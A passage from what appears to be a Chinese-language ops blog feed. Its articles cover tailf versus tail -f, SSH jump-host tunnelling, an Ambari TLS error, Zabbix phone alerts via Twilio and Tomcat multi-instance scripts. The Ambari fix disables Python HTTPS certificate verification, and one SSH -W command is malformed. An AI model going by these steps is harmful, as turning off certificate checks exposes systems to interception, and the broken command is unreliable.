-f</code>查看刚才生成的文件，明显感觉<code>tailf</code>比<code>tail -f</code>时间长</p><p><br></p><h1 id="0x01-分析两者使用过程中系统调用区别"><a href="#0x01-分析两者使用过程中系统调用区别" class="headerlink" title="0x01 分析两者使用过程中系统调用区别"></a>0x01 分析两者使用过程中系统调用区别</h1><figure class="highlight shell"><figcaption><span class="caption">环境准备</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">echo "test" &gt; test</div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> 追踪tailf</span></div><div class="line">strace -o trace_tailf tailf test</div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> 追踪tail -f</span></div><div class="line">strace -o trace_tail_f tail -f test</div></pre></div></div></figure><p><strong>对比结果:</strong></p><p><img src="https://kionf.com/article_images/linux_tailf.jpg" alt="kionf"></p><div class="note info"><p><strong>从上图可以看出主要有两处不同</strong></p></div><p><br></p><figure class="highlight shell"><figcaption><span class="caption">test 文件信息</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">  文件："test"</div><div class="line">  大小：5         块：8          IO 块：4096   普通文件</div><div class="line">设备：fd01h/64769dInode：138235      硬链接：1</div><div class="line">权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)</div><div class="line">最近访问：2018-09-07 17:59:24.842451394 +0800</div><div class="line">最近更改：2018-09-07 17:59:19.175452013 +0800</div><div class="line">最近改动：2018-09-07 17:59:19.175452013 +0800</div><div class="line">创建时间：-</div></pre></div></div></figure><p><br></p><h1 id="0x02-区别"><a href="#0x02-区别" class="headerlink" title="0x02 区别"></a>0x02 区别</h1><h2 id="1-调用函数区别"><a href="#1-调用函数区别" class="headerlink" title="1. 调用函数区别"></a>1. 调用函数区别</h2><p>使用strace追踪命令的系统函数调用导出文件，分析区别</p><figure class="highlight shell"><figcaption><span class="caption">tailf 流程</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">1. 使用stat函数获取文件名，fstat通过文件名获取文件 IO block 信息 4096</div><div class="line">2. read(3, "test\n", 4096)  = 5 #使用read函数从磁盘地址 4096 开始读取文件读取5字节文件大小</div></pre></div></div></figure><figure class="highlight shell"><figcaption><span class="caption">tail -f 流程</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">1. 使用fstat函数通过文件描述符获取信息，获取seek</div><div class="line"></div><div class="line">  lseek(3, 0, SEEK_CUR)               = 0 #开始seek</div><div class="line">  lseek(3, 0, SEEK_END)               = 5 #结束seek</div><div class="line">  lseek(3, 0, SEEK_SET)               = 0 #当前seek位置</div><div class="line"></div><div class="line">2. seek设置到SEEK_END位置，read函数从末尾读取文件</div><div class="line"></div><div class="line">  read(3, "test\n", 5)                    = 5</div><div class="line">  lseek(3, 0, SEEK_SET)                   = 0</div></pre></div></div></figure><p>通过系统函数调用分析得出区别：</p><figure class="highlight sh"><div class="figcode"><div class="code"><pre><div class="line">`tailf`    :  </div><div class="line">       调用系统函数`<span class="built_in">stat</span>()`通过获取到的文件名，查看block位置及大小，`<span class="built_in">read</span>()`从头开始载入指定文件大小块,进行读取</div><div class="line"></div><div class="line">`tail -f`  :  </div><div class="line">       调用系统函数`fstat()`获取文件描述符，`lseek()`函数`SEEK_SET`方法移动文件指针到末尾，从末尾`<span class="built_in">read</span>()`进行读取</div></pre></div></div></figure><p>系统函数对比：</p><p><br></p><figure class="highlight shell"><figcaption><span class="caption">stat(),fstat()</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">系统函数：</div><div class="line"></div><div class="line">  stat()：通过文件名获取文件信息</div><div class="line">  fstat()：通过文件描述符获取文件信息</div><div class="line"></div><div class="line">两者区别：</div><div class="line">  获取文件信息方式不同</div><div class="line"></div><div class="line">安全问题:</div><div class="line">  当使用stat()获取文件并打开它时，文件可能会被修改（或权限被更改），或者被符号链接替，fstat()避免了这个问题。</div></pre></div></div></figure><p><br></p><h2 id="2-调用函数不同，延伸出的区别"><a href="#2-调用函数不同，延伸出的区别" class="headerlink" title="2. 调用函数不同，延伸出的区别"></a>2. 调用函数不同，延伸出的区别</h2><p>开两个窗口，一个窗口tailf文件，另一个窗口操作文件</p><figure class="highlight shell"><figcaption><span class="caption">[窗口1]>tailf，tail -f 文件</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">tailf test</div><div class="line"><span class="meta">#</span><span class="bash"> 执行rm，mv 命令后tailf退出查看文件状态</span></div><div class="line"></div><div class="line">tail -f test</div><div class="line"><span class="meta">#</span><span class="bash"> 执行mv 命令后tail -f继续查看文件，(文件名称改变，文件描述符不变)</span></div><div class="line"><span class="meta">#</span><span class="bash"> 执行rm 命令后tailf -f继续查看文件，重新创建相同文件名仍然无法查看(因为文件的描述符已经改变)</span></div></pre></div></div></figure><figure class="highlight shell"><figcaption><span class="caption">[窗口]2>更改，删除文件</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">rm test</div><div class="line">mv test test.bak</div><div class="line">echo "dddd" &gt; test</div></pre></div></div></figure><blockquote><p>由于获取文件信息方式不同(<code>stat</code>通过文件名,<code>fstat</code>通过文件描述符)，导致当查看文件被删除时，<code>tailf</code>可以获取到文件被删除，<code>tail -f</code>获取不到。</p></blockquote><blockquote><p>由于<code>tail -f</code>使用文件描述符，所以即使查看过程中文件名更改<code>tail -f</code>依旧可以获取到文件内容，而<code>tailf</code> 则无法继续查看文件。</p></blockquote><p>共同点：</p><blockquote><p>打印文件后10行，文件增长读取文件。通过linux<code>stat</code>命令查看文件信息，<code>tailf</code>和<code>tail -f</code>首次访问会改变文件访问时间，如果文件未改变则不会刷新文件访问时间，文件内容改变会再次访问文件并刷新文件访问时间。</p></blockquote><p><br></p><blockquote><p><strong>参考：</strong><br><a href="https://linux.die.net/man/2/fstat" target="_blank" rel="noopener">stat_and_fstat</a><br><a href="https://linux.die.net/man/1/tailf" target="_blank" rel="noopener">tailf</a><br><a href="https://linux.die.net/man/1/tail" target="_blank" rel="noopener">tail</a></p></blockquote>]]></content>
      
      <categories>
          
          <category> ErrorNote </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>混合云通过SSH网关跳板机隧道管理</title>
      <link href="/2018/09/01/ssh-forward/"/>
      <url>/2018/09/01/ssh-forward/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/ssh-forward.jpg" alt="kionf"></p><blockquote class="blockquote-center"><p>通过SSH网关代理，连通混合云，通过<code>堡垒机工具</code>或<code>Ansible</code>统一管理。</p></blockquote><a id="more"></a><h1 id="0x00-问题分析"><a href="#0x00-问题分析" class="headerlink" title="0x00 问题分析"></a>0x00 问题分析</h1><p><strong>以下内容A区代表AWS，B区代表阿里云。并vpc内网络互通，外部访问只能通过堡垒机</strong></p><p>如上图所示，A区为172网段，且只有一台机器可供外网访问，且此机器为现有Ansible堡垒机。现在新加入B区机器需要管理，B区也只提供一台专用SSH网关跳板机供外网访问。</p><div class="note info"><p>需求：B区需要使用A区已有Ansible堡垒机，通过B区提供的专用SSH跳板机直接管理B区所有机器。</p></div><p>这里需要使用SSH，ProxyCommand代理隧道功能，来实现SSH跳板机</p><hr><h1 id="0x01-配置"><a href="#0x01-配置" class="headerlink" title="0x01 配置"></a>0x01 配置</h1><p>通过修改SSH配置来指定SSH隧道代理</p><figure class="highlight sh"><figcaption><span class="fileDir">vim ~/.ssh/</span><span class="caption">config</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></div><div class="code"><pre><div class="line">Host jumpserver</div><div class="line">        User    root                   <span class="comment"># 登录到B区ssh跳板机用户</span></div><div class="line">        Hostname        36.22.13.140   <span class="comment"># B区跳板机IP</span></div><div class="line">        IdentityFile    ~/.ssh/id_rsa  <span class="comment"># ssh跳板机ssh免密key</span></div><div class="line">        <span class="comment"># 连接主机后，需要执行的命令</span></div><div class="line">        ProxyCommand    none</div><div class="line">        <span class="comment"># 禁用密码查询。此选项在脚本和其他没有用户提供密码的批处理作业中很有用</span></div><div class="line">        BatchMode       yes</div><div class="line">        </div><div class="line"></div><div class="line"><span class="comment">#匹配以下host规则，则通过上面的 jumpserver ssh代理隧道连接 </span></div><div class="line">Host 192.168.11.*</div><div class="line">        <span class="comment"># 保持连接，每30s发送心跳 </span></div><div class="line">        ServerAliveInterval     30</div><div class="line">        TCPKeepAlive    yes</div><div class="line">        IdentityFile    ~/.ssh/id_rsa  <span class="comment"># B区机器ssh免密key</span></div><div class="line">        ProxyCommand    ssh -qay jumpserver <span class="string">'nc  %h %p'</span></div><div class="line">        <span class="comment"># 重复使用已存在的连接套接字</span></div><div class="line">        ControlMaster   auto</div></pre></div></div></figure><p><br></p><p><strong>B区SSH跳板机需要安装<code>nc</code>命令</strong></p><figure class="highlight sh"><figcaption><span class="caption">安装net-tools</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">yum -y install net-tools</div></pre></div></div></figure><div class="note danger"><p><strong>注：如果B区SSH网关跳板机不想使用nc命令，需要更改</strong><br><code>ProxyCommand    ssh -qay jumpserver &#39;nc  %h %p&#39;</code><br>为<br><code>ProxyCommand    ssh -W jumpserver %h:%p`</code></p></div><p>A区堡垒机配置到B区机器ssh免密</p><figure class="highlight sh"><figcaption><span class="caption">其他机器自行配置,这里省略</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">ssh-copy-id root@36.22.13.140</div></pre></div></div></figure><hr><h1 id="0x02-连接测试"><a href="#0x02-连接测试" class="headerlink" title="0x02 连接测试"></a>0x02 连接测试</h1><p>在A区堡垒机直接，使用<code>ssh</code>连接B区<code>192.168.11.*</code>的机器</p><figure class="highlight sh"><figcaption><span class="caption">连接机器</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">ssh root@192.168.11.4</div><div class="line"></div><div class="line">root@JumpServer[15:47].ssh:$ ssh 192.168.11.4</div><div class="line">Last login: Sat Sep  8 15:47:02 2018 from 192.168.11.3</div><div class="line">root@nginx-4[15:47]~:$</div></pre></div></div></figure><p>成功通过B区SSH网关跳板机，连接管理B区内网机器。测试直接使用ansible也可管理。</p><blockquote><p>至此，使用SSH网关跳板机管理混合云以配置完成</p></blockquote><hr><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p><br></p><p>通过 B区SSH网关 来连接内部VPC机器，SSH除了人们熟悉常见的登陆管理远程的linux主机意外应用还有很多，ssh的网络转发隧道很强大。</p><p>推荐阅读：<a href="https://kionf.com/2017/01/09/linux-ssh/">ssh端口转发</a></p><p><strong>参考：</strong></p><blockquote><p><a href="https://www.cyberciti.biz/faq/linux-unix-ssh-proxycommand-passing-through-one-host-gateway-server/" target="_blank" rel="noopener">ssh-proxycommand</a><br><a href="https://linux.die.net/man/5/ssh_config" target="_blank" rel="noopener">ssh_config_man</a></p></blockquote>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ambari显示Heartbeat报错</title>
      <link href="/2018/08/30/bigdata-ambari/"/>
      <url>/2018/08/30/bigdata-ambari/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/ambari-error.png" alt="kionf"></p><blockquote class="blockquote-center"><p>启动Ambari web 界面显示服务<code>Heartbeat Lost</code>,  查看Ambari agent日志报错</p></blockquote><a id="more"></a><h1 id="0x00Agent报错如下"><a href="#0x00Agent报错如下" class="headerlink" title="0x00Agent报错如下"></a>0x00Agent报错如下</h1><figure class="highlight plain"><figcaption><span class="fileDir">/var/log/ambari-agent/</span><span class="caption">ambari-agent</span><span class="suffix">.log</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">ERROR 2015-09-23 09:47:07,402 NetUtil.py:77 - [Errno 8] _ssl.c:492: EOF occurred in violation of protocol</div><div class="line">ERROR 2015-09-23 09:47:07,402 NetUtil.py:78 - SSLError: Failed to connect. Please check openssl library versions.</div><div class="line">Refer to: https://bugzilla.redhat.com/show_bug.cgi?id=1022468 for more details.</div><div class="line">WARNING 2015-09-23 09:47:07,402 NetUtil.py:105 - Server at https://ambari-server:8440is not reachable, sleeping for 10 seconds...</div><div class="line">WARNING 2015-09-23 09:47:07,402 NetUtil.py:105 - Server at https://ambari-server:8440is not reachable, sleeping for 10 seconds...</div></pre></div></div></figure><p><br></p><h1 id="0x01解决办法"><a href="#0x01解决办法" class="headerlink" title="0x01解决办法"></a>0x01解决办法</h1><h2 id="1-配置Ambari-agent强制https版本为TLSv1-2"><a href="#1-配置Ambari-agent强制https版本为TLSv1-2" class="headerlink" title="1. 配置Ambari-agent强制https版本为TLSv1_2"></a>1. 配置Ambari-agent强制https版本为TLSv1_2</h2><p>编辑<code>/etc/ambari-agent/conf/ambari-agent.ini</code>。</p><figure class="highlight sh"><figcaption><span class="caption">此为sed添加命令</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">sed -i /\[security\]/a\/force_https_protocol=PROTOCOL_TLSv1_2 /etc/ambari-agent/conf/ambari-agent.ini</div></pre></div></div></figure><p>在<code>[security]</code>后添加如下内容:</p><figure class="highlight xml"><figcaption><span class="fileDir">/etc/ambari-agent/conf/</span><span class="caption">ambari-agent</span><span class="suffix">.ini</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">[security]</div><div class="line diff-addition">force_https_protocol=PROTOCOL_TLSv1_2</div><div class="line">keysdir=/var/lib/ambari-agent/keys</div><div class="line">server_crt=ca.crt</div><div class="line">passphrase_env_var_name=AMBARI_PASSPHRASE</div><div class="line">ssl_verify_cert=0</div><div class="line">credential_lib_dir=/var/lib/ambari-agent/cred/lib</div><div class="line">credential_conf_dir=/var/lib/ambari-agent/cred/conf</div><div class="line">credential_shell_cmd=org.apache.hadoop.security.alias.CredentialShell</div></pre></div></div></figure><h2 id="2-更改python配置关闭https验证"><a href="#2-更改python配置关闭https验证" class="headerlink" title="2. 更改python配置关闭https验证"></a>2. 更改python配置关闭https验证</h2><p>编辑<code>/etc/python/cert-verification.cfg</code> 更改为<code>verify=disable</code></p><figure class="highlight sh"><figcaption><span class="caption">此为sed更改命令</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">sed -i <span class="string">'s/verify=.*/verify=disable/g'</span> /etc/python/cert-verification.cfg</div></pre></div></div></figure><figure class="highlight plain"><figcaption><span class="fileDir">/etc/python/</span><span class="caption">cert-verification</span><span class="suffix">.cfg</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">[https]</div><div class="line diff-deletion">verify=platform_default</div><div class="line diff-addition">verify=disable</div></pre></div></div></figure><p><br></p><h1 id="0x02-重启agent"><a href="#0x02-重启agent" class="headerlink" title="0x02 重启agent"></a>0x02 重启agent</h1><p><code>service ambari-agent restart</code></p><div class="note warning"><p>解决</p></div><p><br></p><h1 id="0x03-原因"><a href="#0x03-原因" class="headerlink" title="0x03 原因"></a>0x03 原因</h1><div class="note info"><p><strong>由于ambari server 端使用JDK1.7启动， 与openssl存在Bug， 更改如上配置文件，更改ssl版本，关闭python https校验.</strong></p></div>]]></content>
      
      <categories>
          
          <category> ErrorNote </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ambari </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Zabbix电话报警</title>
      <link href="/2018/07/06/zabbix-alarm-phone/"/>
      <url>/2018/07/06/zabbix-alarm-phone/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p><strong>Zabbix 使用 <a href="https://www.twilio.com" title="twilio" target="_blank" rel="noopener">twilio</a> 进行免费电话报警, 免除企业认证繁琐步骤</strong></p></blockquote><a id="more"></a><h1 id="0x00-注册-twilio-获取-api-调用key"><a href="#0x00-注册-twilio-获取-api-调用key" class="headerlink" title="0x00 注册 twilio 获取 api 调用key"></a>0x00 注册 twilio 获取 api 调用key</h1><h2 id="1-注册账号"><a href="#1-注册账号" class="headerlink" title="1. 注册账号"></a>1. 注册账号</h2><blockquote><p>注册地址 <a href="https://www.twilio.com/try-twilio" title="Twilio-SignUp" target="_blank" rel="noopener">Twilio-SignUp</a> <strong>需要翻墙</strong></p></blockquote><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_signup.png" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><p><strong>密码至少14个字符，不需要特殊字符</strong></p><p>通过后 选择中国区,  验证手机号</p><p><img src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_01.png" alt="kionf"></p><p>创建项目名称(随便写)</p><p><img src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_02.png" alt="kionf"></p><h2 id="2-获取网络号码"><a href="#2-获取网络号码" class="headerlink" title="2.  获取网络号码"></a>2.  获取网络号码</h2><blockquote><p><a href="https://www.twilio.com/console/voice/build/getting-started" title="初始配置地址" target="_blank" rel="noopener">初始配置地址</a></p></blockquote><p>选择如下选项:</p><p><img src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_03.png" alt="kionf"></p><p>记住这个号码结果<code>+18652052853</code>后期会使用</p><p><img src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_04.png" alt="kionf"></p><p>到此就不用继续走剩下的几步了</p><blockquote><p>其他自定义<a href="https://www.twilio.com/console/phone-numbers/incoming" target="_blank" rel="noopener">电话设置</a>(默认不需要配置)</p></blockquote><p><br></p><hr>   <p><br></p><h1 id="0x01-编辑zabbix调用API脚本"><a href="#0x01-编辑zabbix调用API脚本" class="headerlink" title="0x01 编辑zabbix调用API脚本"></a>0x01 编辑zabbix调用API脚本</h1><blockquote><p>获取<code>API_Key</code><a href="https://www.twilio.com/console/project/settings" target="_blank" rel="noopener">地址</a></p></blockquote><p><code>Dashboard</code>    &gt;&gt;    <code>Settings</code>    &gt;&gt;    <code>General</code>  获取<code>ACCOUNT SID</code>, <code>AUTH TOKEN</code></p><div class="note danger"><p><strong>注意:  试用账号只能打给 注册时使用的手机号!!</strong></p></div><blockquote><p>更改文件属主及权限<code>chown zabbix:zabbix &amp;&amp; chmod +x zabbix_phone.py</code></p></blockquote><figure class="highlight python"><figcaption><span class="fileDir">zabbix/alertscripts/</span><span class="caption">zabbix_phone</span><span class="suffix">.py</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></div><div class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> twilio.rest <span class="keyword">import</span> Client</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Your Account Sid and Auth Token from twilio.com/console</span></div><div class="line marked">account_sid = <span class="string">'your_sid'</span></div><div class="line marked">auth_token = <span class="string">'your_token'</span></div><div class="line">client = Client(account_sid, auth_token)</div><div class="line"></div><div class="line"></div><div class="line">call = client.calls.create(</div><div class="line">                        url=<span class="string">'https://demo.twilio.com/welcome/voice/'</span>,</div><div class="line">                        <span class="comment">#注册使用的手机号</span></div><div class="line marked">                        to=<span class="string">'+8611111'</span>,</div><div class="line">                        <span class="comment">#上面获取到的网络电话号码</span></div><div class="line marked">                        from_=<span class="string">'+19387770820'</span></div><div class="line">                    )</div><div class="line">print(call.sid)</div></pre></div></div></figure><p>执行文件测试, 返回一段id表示成功, 接到电话</p><p><img src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_phone.png" alt="kionf"></p><p><br></p><hr><p><br></p><h1 id="0x02-配置zabbix"><a href="#0x02-配置zabbix" class="headerlink" title="0x02 配置zabbix"></a>0x02 配置zabbix</h1><h2 id="1-添加报警媒介"><a href="#1-添加报警媒介" class="headerlink" title="1. 添加报警媒介"></a>1. 添加报警媒介</h2><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_05.png" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><h2 id="2-连接到用户"><a href="#2-连接到用户" class="headerlink" title="2. 连接到用户"></a>2. 连接到用户</h2><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_06.png" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><h2 id="3-添加到动作"><a href="#3-添加到动作" class="headerlink" title="3. 添加到动作"></a>3. 添加到动作</h2><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_07.png" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><div class="note success"><p>至此<code>zabbix</code>电话报警配置完成, 如果需要免费打给多个用户, 可以注册多个账号,添加多个媒介 然后 绑定到同一个动作中. </p></div>]]></content>
      
      <categories>
          
          <category> 自动化运维 </category>
          
          <category> Zabbix </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Zabbix </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Tomcat单机多实例部署及管理</title>
      <link href="/2018/06/28/tomcat-multiple/"/>
      <url>/2018/06/28/tomcat-multiple/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/tobin01.jpg" alt="傲视群雄"></p><blockquote class="blockquote-center"><p>单台机器部署多个 Tomcat, 每个Tomcat部署独立服务,Tomcat之间启停互不影响</p></blockquote><a id="more"></a><p>不要问我为什么有这个需求, 复制粘贴就是干</p><hr><h1 id="0x00-单机多实例概述"><a href="#0x00-单机多实例概述" class="headerlink" title="0x00 单机多实例概述"></a>0x00 单机多实例概述</h1><p><img src="https://kionf.com/article_images/tomcat-multiple.png" alt="kionf"></p><p>大概的目录结构:</p><ul><li><code>CATALINA_HOME</code> 为Tomcat应用程序运行程序及所需依赖</li><li><code>CATALINA_BASE</code> 即我们即将部署的程序</li></ul><blockquote><p><strong>手动更改如下工作目录:</strong></p></blockquote><figure class="highlight sh"><figcaption><span class="caption">这是我自己个儿整的初始目录结构</span><a href="https://github.com/kalivim/Script/raw/master/Tomcat%E5%8D%95%E6%9C%BA%E5%A4%9A%E5%AE%9E%E4%BE%8B%E7%AE%A1%E7%90%86/INIT_APPS_FILE.tar.gz" download="" target="_blank" rel="noopener"><i class="fa fa-download" aria-hidden="true"></i> download</a></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">war_apps<span class="comment">#手动创建用来存放下载好的war包文件</span></div><div class="line">tomcat<span class="comment">#CATALINA_HOME</span></div><div class="line">├── bin</div><div class="line">├── INIT_APPS_FILE<span class="comment">#CATALINA_BASE</span></div><div class="line">│   ├── conf</div><div class="line">│   ├── logs</div><div class="line">│   ├── temp</div><div class="line">│   ├── webapps</div><div class="line">│   └── work</div><div class="line">└── lib</div></pre></div></div></figure><p>然后呢正常的思路就是配置每个APP的<code>server.xml</code>端口:</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">- Server Port：该端口用于监听关闭tomcat的shutdown命令，默认为8005</div><div class="line">- Connector Port：该端口用于监听HTTP的请求，默认为8080</div><div class="line">- AJP Port：该端口用于监听AJP（ Apache JServ Protocol ）协议上的请求，通常用于整合Apache Server等其他HTTP服务器，默认为8009</div><div class="line">- Redirect Port：重定向端口，出现在Connector配置中，如果该Connector仅支持非SSL的普通http请求，那么该端口会把 https 的请求转发到这个Redirect Port指定的端口，默认为8443；</div></pre></div></div></figure><p>应用太多你难道要一个个手动改? no  no <strong>no!</strong> 上脚本</p><hr><h1 id="0x01-自动部署管理配置"><a href="#0x01-自动部署管理配置" class="headerlink" title="0x01 自动部署管理配置"></a>0x01 自动部署管理配置</h1><p>需要把应用war包传到可下载位置,来用于应用分发,我这里是直接传到了阿里云的oss桶里</p><h2 id="1-添加tomcat更新启停控制脚本"><a href="#1-添加tomcat更新启停控制脚本" class="headerlink" title="1.添加tomcat更新启停控制脚本"></a>1.添加tomcat更新启停控制脚本</h2><div class="note danger"><p>需要安装unzip <code>yum -y install unzip</code> </p></div><figure class="highlight sh"><figcaption><span class="caption">manage.sh需要放在这里,也可以自定义改代码</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">war_apps<span class="comment">#手动创建用来存放下载好的war包文件</span></div><div class="line">tomcat<span class="comment">#CATALINA_HOME</span></div><div class="line">├── bin</div><div class="line diff-addition">├── manage.sh</div><div class="line">├── INIT_APPS_FILE<span class="comment">#CATALINA_BASE</span></div><div class="line">│   ├── conf</div><div class="line">│   ├── logs</div><div class="line">│   ├── temp</div><div class="line">│   ├── webapps</div><div class="line">│   └── work</div><div class="line">└── lib</div></pre></div></div></figure><blockquote><p>蓝色块需要根据实际情况自定义, <strong>应用名称, 和war包下载地址不需要写,后面的python总控制台会自动分配</strong></p></blockquote><figure class="highlight sh"><figcaption><span class="caption">manage</span><span class="suffix">.sh</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"><span class="comment"># Author: Kionf</span></div><div class="line"><span class="comment"># description: 启动tomcat多实例.</span></div><div class="line"><span class="comment"># PATH=/opt/op/java/jdk1.8.0_172/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span></div><div class="line"><span class="comment"># 应用名称</span></div><div class="line">app=</div><div class="line"></div><div class="line"><span class="comment"># war包下载地址</span></div><div class="line">war_url=</div><div class="line"></div><div class="line marked">soft_dir=<span class="string">"/opt/op"</span></div><div class="line">download_war_file=<span class="string">"<span class="variable">$&#123;soft_dir&#125;</span>/war_apps/<span class="variable">$&#123;app&#125;</span>.war"</span></div><div class="line"></div><div class="line"><span class="built_in">export</span> CATALINA_BASE=<span class="string">"<span class="variable">$&#123;soft_dir&#125;</span>/tomcat/<span class="variable">$app</span>"</span></div><div class="line"><span class="built_in">export</span> CATALINA_HOME=<span class="string">"<span 